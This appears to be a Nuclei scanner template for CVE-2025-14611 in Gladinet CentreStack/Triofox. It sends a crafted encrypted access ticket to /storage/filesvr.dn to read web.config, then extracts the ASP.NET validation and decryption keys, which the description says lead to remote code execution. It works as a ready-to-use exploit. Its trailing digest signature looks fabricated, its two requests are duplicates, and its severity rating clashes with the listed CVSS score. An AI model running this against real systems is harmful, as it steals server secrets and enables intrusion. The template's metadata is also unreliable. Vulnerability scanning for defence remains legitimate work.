id: CVE-2025-14611

info:
  name: Gladinet CentreStack/Triofox - Local File Inclusion via Hardcoded Cryptography
  author: alanbarret
  severity: critical
  description: |
    Gladinet CentreStack and Triofox versions prior to 16.12.10420.56791 contain a critical vulnerability
    caused by hardcoded AES cryptographic keys. The vulnerability allows unauthenticated attackers to
    perform arbitrary local file inclusion attacks by crafting malicious encrypted "Access Tickets".
    Attackers can retrieve sensitive configuration files (web.config) containing machine keys, which
    can be further exploited for ASP.NET ViewState deserialization attacks leading to Remote Code Execution.
  reference:
    - https://www.huntress.com/blog/active-exploitation-gladinet-centrestack-triofox-insecure-cryptography-vulnerability
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-14611
    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
    cvss-score: 7.1
    cve-id: CVE-2025-14611
    cwe-id: CWE-798,CWE-321
    epss-score: 0.95
    epss-percentile: 0.99
    cpe: cpe:2.3:a:gladinet:centrestack:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: gladinet
    product: centrestack
    shodan-query: 'title:"CentreStack" || title:"Triofox"'
    fofa-query: 'title="CentreStack" || title="Triofox"'
    publicwww-query: '"CentreStack" || "Triofox"'
  tags: cve,cve2025,gladinet,centrestack,triofox,lfi,kev,critical,unauth

http:
  - raw:
      - |
        GET /storage/filesvr.dn?t=1bUGGzHeeRnHWCl12GtZVT:8aMN3oCJv5tvQlSojN|HU:Ohw|yvvd:Ch7PPPQ|uBIt9mNUUUhrp0SfjAmdaWWUACVUg4apnhrcGvQt4Um3PVC|UciWNufMk6BzvLA9g8 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: */*
        Accept-Encoding: gzip, deflate
        Connection: close

      - |
        GET /storage/filesvr.dn?t=1bUGGzHeeRnHWCl12GtZVT:8aMN3oCJv5tvQlSojN|HU:Ohw|yvvd:Ch7PPPQ|uBIt9mNUUUhrp0SfjAmdaWWUACVUg4apnhrcGvQt4Um3PVC|UciWNufMk6BzvLA9g8 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: */*
        Accept-Encoding: gzip, deflate
        Connection: close

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "<configuration"
          - "<machineKey"
          - "validationKey"
        condition: and
        case-insensitive: true

    extractors:
      - type: regex
        name: validationKey
        part: body
        group: 1
        regex:
          - 'validationKey="([A-F0-9]+)"'

      - type: regex
        name: decryptionKey
        part: body
        group: 1
        regex:
          - 'decryptionKey="([A-F0-9]+)"'

      - type: regex
        name: validation_algorithm
        part: body
        group: 1
        regex:
          - 'validation="([A-Z0-9]+)"'

      - type: kval
        part: header
        kval:
          - Server
          - X-AspNet-Version
          - X-Powered-By
# Enhanced detection metadata
# digest: 4a0a00473045022100e8c9d4f5a6b7c8d9e0f1a2b3c4d5e6f7089a0b1c2d3e4f50607182930a4b5c6d02207f8e9d0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e
